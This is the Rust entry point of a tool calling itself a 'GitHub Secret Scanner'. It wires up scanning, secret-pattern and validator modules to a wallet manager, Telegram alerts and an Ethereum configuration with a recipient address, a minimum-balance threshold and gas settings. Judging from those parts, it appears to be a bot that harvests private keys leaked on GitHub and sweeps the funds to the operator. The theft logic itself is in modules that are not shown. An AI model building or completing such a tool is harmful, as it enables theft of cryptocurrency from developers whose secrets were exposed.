mod config;
mod core;
mod scanner;
mod patterns;
mod validators;
mod wallet;
mod telegram;
mod monitor;
mod models;
mod storage;

use std::sync::Arc;
use tracing::{info, error, warn};
use tracing_subscriber::EnvFilter;
use dotenv::dotenv;

// Jemalloc only for non-Windows platforms
#[cfg(not(target_env = "msvc"))]
use jemallocator::Jemalloc;

#[cfg(not(target_env = "msvc"))]
#[global_allocator]
static GLOBAL: Jemalloc = Jemalloc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load .env file
    dotenv().ok();
    
    // Initialize tracing
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| EnvFilter::new("info"))
        )
        .with_target(false)
        .with_thread_ids(true)
        .with_thread_names(true)
        .compact()
        .init();

    info!("🚀 Starting GitHub Secret Scanner...");
    info!("🔄 Version: {}", env!("CARGO_PKG_VERSION"));
    
    // Load configuration
    let config = match config::Config::from_env() {
        Ok(c) => {
            info!("✅ Configuration loaded");
            Arc::new(c)
        }
        Err(e) => {
            error!("❌ Configuration failed: {}", e);
            return Err(e.into());
        }
    };
    
    // Initialize storage
    let _store = storage::file_store::FileStore::new();
    info!("✅ File storage initialized");
    
    // Initialize wallet manager
    let wallet_manager = match wallet::manager::WalletManager::new(config.clone()) {
        Ok(wm) => {
            info!("✅ Wallet manager initialized");
            Arc::new(wm)
        }
        Err(e) => {
            error!("❌ Wallet manager failed: {}", e);
            return Err(e.into());
        }
    };
    
    // Initialize Telegram alerts (optional)
    let telegram = telegram::alerts::TelegramAlerts::new_optional(config.clone());
    
    // Initialize cache
    let cache = core::cache::CacheManager::new();
    info!("✅ Cache manager initialized");
    
    // Print configuration summary
    print_config_summary(&config);
    
    // Create scan engine
    let scan_engine = scanner::engine::ScanEngine::new(
        config.clone(),
        cache.clone(),
        telegram.clone(),
        wallet_manager.clone(),
    );
    
    info!("🔧 Starting scanner engine...");
    
    // Run main scanner engine
    scan_engine.run().await;
    
    Ok(())
}

fn print_config_summary(config: &config::Config) {
    info!("📋 Configuration Summary:");
    info!("  ├─ GitHub API: {}", config.github_api_url);
    info!("  ├─ GitHub Token: {}", 
        if config.github_token.is_some() { "✅ Configured" } else { "❌ Not set" });
    info!("  ├─ Telegram: {}", 
        if !config.telegram_bot_token.is_empty() { "✅ Enabled" } else { "❌ Disabled" });
    info!("  ├─ RPC URL: {}", config.rpc_url);
    info!("  ├─ Chain ID: {}", config.chain_id);
    info!("  ├─ Recipient: {}", 
        if !config.recipient_address.is_empty() { 
            format!("{}...{}", &config.recipient_address[..6], &config.recipient_address[38..]) 
        } else { 
            "Not configured".to_string() 
        });
    info!("  ├─ Poll Interval: {}s", config.poll_interval_secs);
    info!("  ├─ Min Balance: {} ETH", config.min_balance_threshold);
    info!("  ├─ Gas Limit: {}", config.gas_limit);
    info!("  └─ Gas Price: {} Gwei", config.gas_price_gwei);
}